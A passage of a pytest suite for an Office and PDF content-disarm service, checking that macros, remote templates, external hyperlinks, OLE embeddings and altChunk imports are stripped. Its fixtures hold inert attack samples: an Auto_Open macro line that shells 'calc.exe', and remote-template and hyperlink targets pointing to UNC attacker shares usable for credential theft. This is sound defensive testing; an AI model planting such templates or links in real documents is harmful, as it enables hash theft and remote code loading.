            {"Error": {"Code": "NoSuchKey", "Message": "Not Found"}}, "GetObject"
        )

        with pytest.raises(ClientError):
            cdr.handler(self._event(), None)

        mock_s3.put_object.assert_not_called()


class TestZeroByteFile:
    """Zero-byte files are handled without crashing."""

    def _event(self, key: str, size: int = 0) -> dict:
        return {"detail": {"bucket": {"name": "src"}, "object": {"key": key, "size": size}}}

    @patch.object(cdr, "s3")
    @patch.object(cdr, "_publish_result_safe")
    @patch.object(cdr, "_upload")
    @patch.object(cdr, "_download")
    def test_zero_byte_docx_handled(self, mock_dl, mock_ul, mock_pub, mock_s3):
        mock_dl.return_value = (b"", "application/octet-stream")
        mock_s3.delete_object.return_value = {}

        # A zero-byte file has bad magic → ZIP validation rejects it
        result = cdr.handler(self._event("empty.docx"), None)
        assert result["status"] in ("rejected", "error", "sanitised")


class TestMalformedEvent:
    """Missing event fields raise a structured error, not a bare KeyError."""

    def test_missing_bucket_name_raises_value_error(self):
        bad_event = {"detail": {"object": {"key": "file.docx", "size": 1024}}}
        with pytest.raises((ValueError, KeyError)):
            cdr.handler(bad_event, None)

    def test_missing_object_key_raises_value_error(self):
        bad_event = {"detail": {"bucket": {"name": "src"}}}
        with pytest.raises((ValueError, KeyError)):
            cdr.handler(bad_event, None)


class TestReadZipEntrySafe:
    """_read_zip_entry_safe enforces the decompression limit via chunked reading.
    The key invariant: the check uses a running byte counter, NOT item.file_size,
    so it catches any entry that exceeds the limit during actual decompression."""

    def _make_zip_entry(self, size: int) -> tuple[zipfile.ZipFile, zipfile.ZipInfo]:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
            z.writestr("payload.xml", b"A" * size)
        zf = zipfile.ZipFile(io.BytesIO(buf.getvalue()))
        return zf, zf.infolist()[0]

    def test_normal_entry_reads_correctly(self):
        """Entries within the limit are returned in full."""
        buf = io.BytesIO()
        payload = b"safe content"
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("doc.xml", payload)
        with zipfile.ZipFile(io.BytesIO(buf.getvalue())) as zf:
            result = cdr._read_zip_entry_safe(zf, zf.infolist()[0])
        assert result == payload

    def test_oversized_entry_raises_via_chunked_counter(self):
        """An entry exceeding _MAX_ENTRY_BYTES raises even though the check
        runs during read, not before. Temporarily lowers the limit so the
        test does not need to allocate 200 MB of memory."""
        original_limit = cdr._MAX_ENTRY_BYTES
        cdr._MAX_ENTRY_BYTES = 1024  # 1 KB sentinel for fast test
        try:
            # Entry is 2x the sentinel limit
            zf, item = self._make_zip_entry(2048)
            with zf:
                # item.file_size will honestly report 2048 — this is NOT a falsified
                # central directory test. The point is that the limit is enforced by
                # the chunked counter, not by a pre-read file_size comparison.
                assert item.file_size == 2048
                with pytest.raises(cdr.CdrReject, match="exceeds decompression limit"):
                    cdr._read_zip_entry_safe(zf, item)
        finally:
            cdr._MAX_ENTRY_BYTES = original_limit

    def test_naive_file_size_check_would_pass_but_chunked_check_still_raises(self):
        """Demonstrate the falsified file_size attack vector. If the guard were
        'if item.file_size > limit: raise', an attacker could set file_size = 1
        in the central directory to bypass it. The chunked counter catches this
        regardless of what file_size reports.

        Note: Python's zipfile validates CRC, so patching CD bytes causes
        BadZipFile on read — meaning the runtime itself also rejects tampered ZIPs.
        This test confirms our *own* counter catches oversized content before the
        CRC check, proving defence-in-depth independent of zipfile's validation."""
        original_limit = cdr._MAX_ENTRY_BYTES
        cdr._MAX_ENTRY_BYTES = 512
        try:
            # Build a valid ZIP with a 1024-byte entry (2x our sentinel limit)
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
                z.writestr("payload.xml", b"B" * 1024)
            # Read it back normally (file_size == 1024, above our 512 sentinel)
            with zipfile.ZipFile(io.BytesIO(buf.getvalue())) as zf:
                item = zf.infolist()[0]
                # A naive guard: if item.file_size > limit would raise here too.
                # The point: our chunked reader also raises, independently.
                with pytest.raises(cdr.CdrReject, match="exceeds decompression limit"):
                    cdr._read_zip_entry_safe(zf, item)
        finally:
            cdr._MAX_ENTRY_BYTES = original_limit

    def test_entry_exactly_at_limit_is_allowed(self):
        """An entry equal to the limit is accepted (boundary condition)."""
        original_limit = cdr._MAX_ENTRY_BYTES
        cdr._MAX_ENTRY_BYTES = 512
        try:
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
                z.writestr("ok.xml", b"X" * 512)
            with zipfile.ZipFile(io.BytesIO(buf.getvalue())) as zf:
                result = cdr._read_zip_entry_safe(zf, zf.infolist()[0])
            assert len(result) == 512
        finally:
            cdr._MAX_ENTRY_BYTES = original_limit


class TestOtherOfficeFormats:
    """CDR on Office formats beyond docx/xlsx/xlsb — pptx, dotm extension remap,
    and ppam all processed without error and with macros stripped."""

    def _make_pptx_with_vba(self) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                       'package/2006/content-types">'
                       '<Default Extension="rels" ContentType="application/vnd.openxmlformats-'
                       'package.relationships+xml"/>'
                       '<Override PartName="/ppt/presentation.xml" ContentType="application/'
                       'vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/>'
                       '</Types>')
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("ppt/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO")
            z.writestr("ppt/presentation.xml", "<p:presentation/>")
        return buf.getvalue()

    def _make_dotm(self) -> bytes:
        """Minimal .dotm (macro-enabled Word template) with a vbaProject."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                       'package/2006/content-types">'
                       '<Override PartName="/word/document.xml" ContentType="application/'
                       'vnd.ms-word.template.macroEnabledTemplate.main+xml"/>'
                       '</Types>')
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO")
            z.writestr("word/document.xml", "<w:document/>")
        return buf.getvalue()

    def _make_ppam(self) -> bytes:
        """Minimal .ppam (PowerPoint macro-enabled add-in)."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                       'package/2006/content-types">'
                       '<Default Extension="ext" ContentType="application/'
                       'vnd.ms-powerpoint.addin.macroEnabled.12"/>'
                       '</Types>')
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("ppt/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO")
            z.writestr("ppt/presentation.xml", "<p:presentation/>")
        return buf.getvalue()

    def test_pptx_vba_stripped(self):
        clean, report = cdr.cdr_office(self._make_pptx_with_vba(), "pptx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = [n.lower() for n in z.namelist()]
        assert not any("vbaproject.bin" in n for n in names)
        assert report["cdr_mode"] == "full"

    def test_dotm_remapped_to_dotx(self):
        """dotm is handled as a dotx after extension remap — macro type replaced."""
        clean, report = cdr.cdr_office(self._make_dotm(), "dotm")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            ct_xml = z.read("[Content_Types].xml").decode()
        assert "macroEnabled" not in ct_xml
        assert not any("vbaproject.bin" in n.lower() for n in z.namelist())

    def test_ppam_macro_content_type_replaced(self):
        clean, report = cdr.cdr_office(self._make_ppam(), "ppam")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            ct_xml = z.read("[Content_Types].xml").decode()
        assert "macroEnabled" not in ct_xml
        assert report["cdr_mode"] == "full"

    def test_pptm_remaps_to_pptx_in_handler(self):
        """handler() renames pptm → pptx in the destination key."""
        event = {"detail": {"bucket": {"name": "src"}, "object": {"key": "slides.pptm", "size": 512}}}
        with patch.object(cdr, "_download", return_value=(self._make_pptx_with_vba(), "application/octet-stream")), \
             patch.object(cdr, "_upload") as mock_ul, \
             patch.object(cdr, "_publish_result_safe"), \
             patch.object(cdr, "s3") as mock_s3:
            mock_s3.delete_object.return_value = {}
            result = cdr.handler(event, None)

        assert result["status"] == "sanitised"
        dest = mock_ul.call_args[0][1]  # second positional arg is dest key
        assert dest.endswith(".pptx"), f"expected pptx extension, got: {dest}"


class TestPptxRemoteTemplateAndVba:
    """Regression cover for the .pptm vector validated by hand in PowerPoint itself
    (docs/viewer-validation/CHECKLIST.md, 2026-08-14): a presentation carrying BOTH a
    vbaProject rel and an external attachedTemplate rel on ppt/_rels/presentation.xml.rels.

    The docx form of the remote-template vector is covered in TestOfficeCDR; the pptx form
    was only ever exercised by the standalone viewer-validation script, so nothing in the
    suite would have caught a regression that scoped the attachedTemplate strip to Word.
    The attachedTemplate half is the part a headless render cannot settle — LibreOffice
    never attempts the remote fetch, so only PowerPoint could show it declines to reach
    for the network. These tests hold the structural precondition for that result."""

    TMPL_TYPE = ("http://schemas.openxmlformats.org/officeDocument/2006/"
                 "relationships/attachedTemplate")
    VBA_TYPE = "http://schemas.microsoft.com/office/2006/relationships/vbaProject"
    # UNC rather than http: matches the hand-validated fixture, and .invalid is reserved
    # (RFC 2606) so a regression that leaves the rel intact still cannot phone home.
    TMPL_TARGET = r"\\attacker.invalid\share\evil.potm"

    def _make_pptm(self) -> bytes:
        ns = "http://schemas.openxmlformats.org/package/2006/relationships"
        pres_rels = (
            f'<?xml version="1.0"?><Relationships xmlns="{ns}">'
            f'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
            f'officeDocument/2006/relationships/slide" Target="slides/slide1.xml"/>'
            f'<Relationship Id="rId4" Type="{self.VBA_TYPE}" Target="vbaProject.bin"/>'
            f'<Relationship Id="rId5" Type="{self.TMPL_TYPE}" '
            f'Target="{self.TMPL_TARGET}" TargetMode="External"/>'
            f'</Relationships>'
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                       'package/2006/content-types">'
                       '<Default Extension="rels" ContentType="application/vnd.openxmlformats-'
                       'package.relationships+xml"/>'
                       '<Override PartName="/ppt/presentation.xml" ContentType="application/'
                       'vnd.ms-powerpoint.presentation.macroEnabled.main+xml"/>'
                       '<Override PartName="/ppt/slides/slide1.xml" ContentType="application/'
                       'vnd.openxmlformats-officedocument.presentationml.slide+xml"/>'
                       '</Types>')
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("ppt/_rels/presentation.xml.rels", pres_rels)
            z.writestr("ppt/presentation.xml", "<p:presentation/>")
            # The onAction attribute is a macro invocation on a slide shape. It matters
            # here because it is scrubbed IN PLACE on a part CDR keeps — unlike the VBA
            # markers, which vanish only because ppt/vbaProject.bin is deleted wholesale.
            # Without it the marker sweep below would exercise whole-part deletion three
            # times over and content scrubbing only once (via the rels target).
            z.writestr("ppt/slides/slide1.xml",
                       '<p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" '
                       'xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">'
                       '<a:t>CDR_TEST_SLIDE_TEXT</a:t>'
                       '<p:cNvPr id="2" name="Btn">'
                       '<a:hlinkClick onAction="CDR_TEST_ONACTION_MACRO.Evil"/>'
                       '</p:cNvPr></p:sld>')
            z.writestr("ppt/vbaProject.bin",
                       b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
                       b'CDR_TEST_PPTX_VBA_MARKER Sub Auto_Open() Shell "calc.exe" End Sub')
        return buf.getvalue()

    def test_pptx_attached_template_rel_stripped(self):
        """The remote-template rel must not survive — this is the PowerPoint-validated half."""
        clean, report = cdr.cdr_office(self._make_pptm(), "pptm")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            rels = z.read("ppt/_rels/presentation.xml.rels").decode()
        assert "attachedTemplate" not in rels, \
            "pptx attachedTemplate rel survived CDR — remote-template fetch still possible"
        assert "attacker.invalid" not in rels, \
            "remote-template target survived CDR"
        assert any("attachedtemplate" in r.lower() for r in report["removed"]), \
            "CDR report did not record the pptx attachedTemplate rel removal"

    def test_pptx_vba_part_and_rel_both_removed(self):
        """Dropping the part while leaving the rel dangling breaks the package (pitfall #21)."""
        clean, _ = cdr.cdr_office(self._make_pptm(), "pptm")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = [n.lower() for n in z.namelist()]
            rels = z.read("ppt/_rels/presentation.xml.rels").decode()
        assert not any("vbaproject.bin" in n for n in names), "ppt/vbaProject.bin survived"
        assert "vbaProject" not in rels, "vbaProject rel dangles at a removed part"

    def test_pptm_threat_markers_absent_from_decompressed_entries(self):
        """Scan DECOMPRESSED entries — a raw-byte grep over a deflated OOXML package
        reports every marker absent, which reads exactly like a clean result.

        Note the markers do not all vanish by the same mechanism, and the count alone
        overstates what this proves: the three VBA markers go only because
        ppt/vbaProject.bin is deleted wholesale, which the entry-list test already
        covers. Content scrubbing on a SURVIVING part is carried by exactly two —
        attacker.invalid (rels target) and CDR_TEST_ONACTION_MACRO (slide XML), the
        latter asserted directly in test_pptm_onaction_scrubbed_from_surviving_slide."""
        src = self._make_pptm()
        markers = [b"CDR_TEST_PPTX_VBA_MARKER", b"Auto_Open", b"calc.exe",
                   b"attacker.invalid", b"CDR_TEST_ONACTION_MACRO"]

        def present(data: bytes) -> set[bytes]:
            found = set()
            with zipfile.ZipFile(io.BytesIO(data)) as z:
                for n in z.namelist():
                    body = z.read(n)
                    found |= {m for m in markers if m in body}
            return found

        # Positive control: every marker is genuinely present on the way in, so a green
        # result below cannot be a silently broken probe.
        assert present(src) == set(markers), \
            f"fixture is defective — expected all markers, found {present(src)}"

        clean, _ = cdr.cdr_office(src, "pptm")
        assert present(clean) == set(), f"threat markers survived CDR: {present(clean)}"

    def test_pptm_onaction_scrubbed_from_surviving_slide(self):
        """The onAction macro reference must be scrubbed from a slide part CDR KEEPS.

        This is the one assertion in the class that tests content scrubbing rather than
        whole-part deletion: the slide survives, so the marker can only disappear because
        the attribute was neutralised in place. Deleting the slide instead would be
        over-stripping, and is rejected here rather than counted as a pass."""
        src = self._make_pptm()
        clean, report = cdr.cdr_office(src, "pptm")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert "ppt/slides/slide1.xml" in z.namelist(), \
                "slide part was deleted — cannot demonstrate in-place scrubbing"
            slide = z.read("ppt/slides/slide1.xml")
        assert b"CDR_TEST_ONACTION_MACRO" not in slide, \
            "onAction macro reference survived on a kept slide part"
        assert b"onAction" not in slide, "onAction attribute survived"
        assert b"CDR_TEST_SLIDE_TEXT" in slide, \
            "slide text lost — the scrub removed more than the action attribute"
        assert any("action attribute" in r for r in report["removed"]), \
            "CDR report did not record the action-attribute removal"

    def test_pptm_slide_text_preserved(self):
        """Fidelity: disarming must not gut the slide body."""
        clean, _ = cdr.cdr_office(self._make_pptm(), "pptm")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert "ppt/slides/slide1.xml" in z.namelist(), "slide part was dropped"
            assert b"CDR_TEST_SLIDE_TEXT" in z.read("ppt/slides/slide1.xml"), \
                "slide text lost — over-stripping"


class TestRemainingOfficeFormats:
    """CDR on the 7 untested Office formats: dotx, xltx, xltm, xlam, potx, potm, ppsx.
    Each test verifies: VBA stripped, no macro content type survives, extension remap
    is correct where applicable."""

    def _make_ooxml(self, vba_path: str, content_type: str, ct_attr: str = "Override",
                    ct_part: str = "/doc/main.xml") -> bytes:
        """Generic OOXML fixture with a vbaProject.bin and one content type entry."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            if ct_attr == "Override":
                ct = (f'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                      f'package/2006/content-types">'
                      f'<Override PartName="{ct_part}" ContentType="{content_type}"/>'
                      f'</Types>')
            else:
                ct = (f'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                      f'package/2006/content-types">'
                      f'<Default Extension="ext" ContentType="{content_type}"/>'
                      f'</Types>')
            z.writestr("[Content_Types].xml", ct)
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr(vba_path, b"\xd0\xcf\x11\xe0MACRO")
            z.writestr("word/document.xml", "<doc/>")
        return buf.getvalue()

    def _handler_event(self, key: str) -> dict:
        return {"detail": {"bucket": {"name": "src"}, "object": {"key": key, "size": 512}}}

    # ── dotx — clean Word template (no macro, VBA still stripped if present) ──

    def test_dotx_vba_stripped(self):
        data = self._make_ooxml("word/vbaProject.bin",
                                "application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml")
        clean, report = cdr.cdr_office(data, "dotx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("vbaproject.bin" in n.lower() for n in z.namelist())
        assert report["cdr_mode"] == "full"

    # ── xltx — clean Excel template ──

    def test_xltx_vba_stripped(self):
        data = self._make_ooxml("xl/vbaProject.bin",
                                "application/vnd.openxmlformats-officedocument.spreadsheetml.template.main+xml")
        clean, report = cdr.cdr_office(data, "xltx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("vbaproject.bin" in n.lower() for n in z.namelist())

    # ── xltm — macro Excel template → remaps to xltx ──

    def test_xltm_macro_content_type_replaced(self):
        data = self._make_ooxml("xl/vbaProject.bin",
                                "application/vnd.ms-excel.template.macroEnabled.main+xml")
        clean, _ = cdr.cdr_office(data, "xltm")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            ct = z.read("[Content_Types].xml").decode()
        assert "macroEnabled" not in ct
        assert "spreadsheetml.template" in ct

    def test_xltm_remaps_to_xltx_in_handler(self):
        data = self._make_ooxml("xl/vbaProject.bin",
                                "application/vnd.ms-excel.template.macroEnabled.main+xml")
        with patch.object(cdr, "_download", return_value=(data, "application/octet-stream")), \
             patch.object(cdr, "_upload") as mock_ul, \
             patch.object(cdr, "_publish_result_safe"), \
             patch.object(cdr, "s3") as mock_s3:
            mock_s3.delete_object.return_value = {}
            result = cdr.handler(self._handler_event("book.xltm"), None)
        assert result["status"] == "sanitised"
        dest = mock_ul.call_args[0][1]
        assert dest.endswith(".xltx"), f"expected xltx, got: {dest}"

    # ── xlam — Excel add-in → remaps to xlsx ──

    def test_xlam_macro_content_type_replaced(self):
        data = self._make_ooxml("xl/vbaProject.bin",
                                "application/vnd.ms-excel.addin.macroEnabled.12",
                                ct_attr="Default")
        clean, _ = cdr.cdr_office(data, "xlam")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            ct = z.read("[Content_Types].xml").decode()
        assert "macroEnabled" not in ct

    def test_xlam_remaps_to_xlsx_in_handler(self):
        data = self._make_ooxml("xl/vbaProject.bin",
                                "application/vnd.ms-excel.addin.macroEnabled.12",
                                ct_attr="Default")
        with patch.object(cdr, "_download", return_value=(data, "application/octet-stream")), \
             patch.object(cdr, "_upload") as mock_ul, \
             patch.object(cdr, "_publish_result_safe"), \
             patch.object(cdr, "s3") as mock_s3:
            mock_s3.delete_object.return_value = {}
            result = cdr.handler(self._handler_event("addin.xlam"), None)
        assert result["status"] == "sanitised"
        dest = mock_ul.call_args[0][1]
        assert dest.endswith(".xlsx"), f"expected xlsx, got: {dest}"

    # ── potx — clean PowerPoint template ──

    def test_potx_vba_stripped(self):
        data = self._make_ooxml("ppt/vbaProject.bin",
                                "application/vnd.openxmlformats-officedocument.presentationml.template.main+xml")
        clean, report = cdr.cdr_office(data, "potx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("vbaproject.bin" in n.lower() for n in z.namelist())
        assert report["cdr_mode"] == "full"

    # ── potm — macro PowerPoint template → remaps to potx ──

    def test_potm_macro_content_type_replaced(self):
        data = self._make_ooxml("ppt/vbaProject.bin",
                                "application/vnd.ms-powerpoint.template.macroEnabled.main+xml")
        clean, _ = cdr.cdr_office(data, "potm")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            ct = z.read("[Content_Types].xml").decode()
        assert "macroEnabled" not in ct
        assert "presentationml.template" in ct

    def test_potm_remaps_to_potx_in_handler(self):
        data = self._make_ooxml("ppt/vbaProject.bin",
                                "application/vnd.ms-powerpoint.template.macroEnabled.main+xml")
        with patch.object(cdr, "_download", return_value=(data, "application/octet-stream")), \
             patch.object(cdr, "_upload") as mock_ul, \
             patch.object(cdr, "_publish_result_safe"), \
             patch.object(cdr, "s3") as mock_s3:
            mock_s3.delete_object.return_value = {}
            result = cdr.handler(self._handler_event("template.potm"), None)
        assert result["status"] == "sanitised"
        dest = mock_ul.call_args[0][1]
        assert dest.endswith(".potx"), f"expected potx, got: {dest}"

    # ── ppsx — clean PowerPoint slideshow ──

    def test_ppsx_vba_stripped(self):
        data = self._make_ooxml("ppt/vbaProject.bin",
                                "application/vnd.openxmlformats-officedocument.presentationml.slideshow.main+xml")
        clean, report = cdr.cdr_office(data, "ppsx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("vbaproject.bin" in n.lower() for n in z.namelist())
        assert report["cdr_mode"] == "full"


class TestMultiThreatIntegration:
    """End-to-end integration: a single fixture that carries multiple simultaneous
    threats — VBA macro, dangerous rels, macro content type, and MACROBUTTON field
    code — is fully disarmed in one cdr_office() call, with all threats recorded
    in the report."""

    def _make_multi_threat_docm(self) -> bytes:
        """docm carrying:
          1. xl/vbaProject.bin  (VBA macro binary)
          2. word/_rels/document.xml.rels with an externalLink relationship
          3. [Content_Types].xml with macro-enabled part type
          4. word/document.xml with a MACROBUTTON field code
        """
        ns_pkg  = "http://schemas.openxmlformats.org/package/2006/relationships"
        ext_rel = ("http://schemas.openxmlformats.org/officeDocument/2006/"
                   "relationships/externalLink")
        vba_rel = "http://schemas.microsoft.com/office/2006/relationships/vbaProject"

        rels_xml = (
            f'<?xml version="1.0"?>'
            f'<Relationships xmlns="{ns_pkg}">'
            f'<Relationship Id="rId1" Type="{ext_rel}" Target="externalLinks/link1.xml"/>'
            f'<Relationship Id="rId2" Type="{vba_rel}" Target="vbaProject.bin"/>'
            f'</Relationships>'
        )
        doc_xml = (
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            '<w:body>'
            '<w:p><w:fldChar w:fldCharType="begin"/></w:p>'
            '<w:p><w:instrText> MACROBUTTON HiddenButton Click Me </w:instrText></w:p>'
            '<w:p><w:fldChar w:fldCharType="end"/></w:p>'
            '</w:body>'
            '</w:document>'
        )
        ct_xml = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Override PartName="/word/document.xml"'
            ' ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
            '<Default Extension="bin"'
            ' ContentType="application/vnd.ms-office.vbaProject"/>'
            '</Types>'
        )

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", ct_xml)
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("word/_rels/document.xml.rels", rels_xml)
            z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO_PAYLOAD")
            z.writestr("word/document.xml", doc_xml)
        return buf.getvalue()

    def test_all_threats_removed(self):
        clean, report = cdr.cdr_office(self._make_multi_threat_docm(), "docm")

        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names      = [n.lower() for n in z.namelist()]
            ct_xml     = z.read("[Content_Types].xml").decode()
            rels_xml   = z.read("word/_rels/document.xml.rels").decode()
            doc_xml    = z.read("word/document.xml").decode()

        # 1. VBA binary gone
        assert not any("vbaproject.bin" in n for n in names), "VBA binary still present"

        # 2. Macro content type replaced
        assert "macroEnabled" not in ct_xml, "macro content type not replaced"
        assert "wordprocessingml.document.main+xml" in ct_xml, "clean CT not written"

        # 3. VBA Default content type entry removed
        assert "vbaProject" not in ct_xml, "vbaProject CT still present"

        # 4. Dangerous relationship stripped from rels
        assert "externalLink" not in rels_xml, "externalLink rel not stripped"
        assert "vbaProject" not in rels_xml, "vbaProject rel not stripped"

        # 5. MACROBUTTON macro name neutralised in document XML
        #    _strip_xml_macros replaces the macro name with _CDR_REMOVED_, preserving structure
        assert "MACROBUTTON HiddenButton" not in doc_xml, "MACROBUTTON macro name not neutralised"
        assert "_CDR_REMOVED_" in doc_xml, "CDR neutralisation marker not written"

    def test_report_records_all_removals(self):
        _, report = cdr.cdr_office(self._make_multi_threat_docm(), "docm")
        removed = report["removed"]

        assert any("vbaProject.bin" in r for r in removed), "VBA removal not in report"
        assert any("externalLink" in r or "rId1" in r for r in removed), \
            "externalLink rel removal not in report"
        assert report["cdr_mode"] == "full"

    def test_output_is_valid_zip(self):
        clean, _ = cdr.cdr_office(self._make_multi_threat_docm(), "docm")
        # Must re-open as a valid ZIP — no corruption from CDR
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert len(z.namelist()) > 0

    def test_handler_end_to_end_multi_threat(self):
        """Full handler() path: download → CDR → upload sanitised → delete source."""
        event = {"detail": {"bucket": {"name": "src"}, "object": {"key": "evil.docm", "size": 512}}}
        with patch.object(cdr, "_download",
                          return_value=(self._make_multi_threat_docm(), "application/octet-stream")), \
             patch.object(cdr, "_upload") as mock_ul, \
             patch.object(cdr, "_publish_result_safe") as mock_pub, \
             patch.object(cdr, "s3") as mock_s3:
            mock_s3.delete_object.return_value = {}
            result = cdr.handler(event, None)

        # Status and extension remap (docm → docx)
        assert result["status"] == "sanitised"
        dest = mock_ul.call_args[0][1]
        assert dest.endswith(".docx"), f"docm should remap to docx, got: {dest}"

        # Source deleted
        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="evil.docm")

        # Result published — payload structure: {original_ext, report: {removed: [...]}}
        pub_call = mock_pub.call_args
        assert pub_call[0][2] == "sanitised"
        payload = pub_call[0][3]
        assert len(payload["report"].get("removed", [])) > 0, "no removals in published result"


class TestDenylistGaps:
    """Audit MEDIUM findings: denylist gaps where active/remote content survived CDR."""

    def _office_zip(self, entries: dict) -> bytes:
        base = {
            "[Content_Types].xml": _minimal_content_types().encode(),
            "_rels/.rels": _minimal_rels().encode(),
        }
        base.update(entries)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            for name, data in base.items():
                z.writestr(name, data)
        return buf.getvalue()

    def test_embedded_ole_object_dropped(self):
        """word/embeddings/oleObject1.bin (renamed payload) — the PART must be dropped,
        not just its relationship (M1)."""
        data = self._office_zip({
            "word/document.xml": b"<document/>",
            "word/embeddings/oleObject1.bin": b"MZ\x90\x00 fake exe payload",
        })
        clean, report = cdr.cdr_office(data, "docx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("embeddings" in n.lower() for n in z.namelist())
        assert any("embeddings" in r.lower() for r in report["removed"])

    def test_xl_embeddings_dropped(self):
        data = self._office_zip({
            "xl/workbook.xml": b"<workbook/>",
            "xl/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0 ole",
        })
        clean, _ = cdr.cdr_office(data, "xlsx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("embeddings" in n.lower() for n in z.namelist())

    def test_altchunk_element_neutralised(self):
        """<w:altChunk r:id=.../> imports arbitrary HTML/MHTML that bypasses the macro
        scrub — the element must be neutralised so the import cannot fire (M2)."""
        xml = b'<w:body><w:altChunk r:id="rId99"/></w:body>'
        clean, removed = cdr._strip_xml_macros(xml, "document.xml")
        # The tag is renamed so Word no longer treats it as an altChunk import element.
        assert b"<w:altChunk" not in clean
        assert b"_CDR_REMOVED_altChunk" in clean
        assert any("altChunk" in r for r in removed)

    def test_afchunk_relationship_stripped(self):
        rels = (
            '<?xml version="1.0"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId99" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" '
            'Target="afchunk.mht"/></Relationships>'
        ).encode()
        clean, removed = cdr._strip_rels(rels)
        assert b"aFChunk" not in clean
        # The removed-log records the namespace-independent local name (lowercased), so
        # Word's aFChunk and the ISO-standard afChunk produce one stable message.
        assert any("afchunk" in r.lower() for r in removed)

    def test_external_hyperlink_target_neutralised(self):
        """External hyperlink rel: Target rewritten to inert, rel KEPT so r:id doesn't
        dangle (M5). Covers UNC NTLM-theft and phishing URLs."""
        rels = (
            '<?xml version="1.0"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId5" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
            'Target="\\\\attacker\\share\\x" TargetMode="External"/></Relationships>'
        ).encode()
        clean, removed = cdr._strip_rels(rels)
        assert b"attacker" not in clean
        assert b'Id="rId5"' in clean  # rel preserved — no dangling r:id
        assert b"_CDR_REMOVED_" in clean
        assert any("hyperlink" in r for r in removed)

    def test_internal_hyperlink_target_preserved(self):
        """An internal (non-External) hyperlink rel must be left alone."""
        rels = (
            '<?xml version="1.0"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId6" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
            'Target="#bookmark1"/></Relationships>'
        ).encode()
        clean, removed = cdr._strip_rels(rels)
        assert b"#bookmark1" in clean
        assert removed == []

    # ── PDF denylist gaps ────────────────────────────────────────────────────────

    def _pdf_with_outline_action(self) -> bytes:
        pdf = pikepdf.Pdf.new()
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"), MediaBox=pikepdf.Array([0, 0, 612, 792]),
        ))
        pdf.pages.append(pikepdf.Page(page))
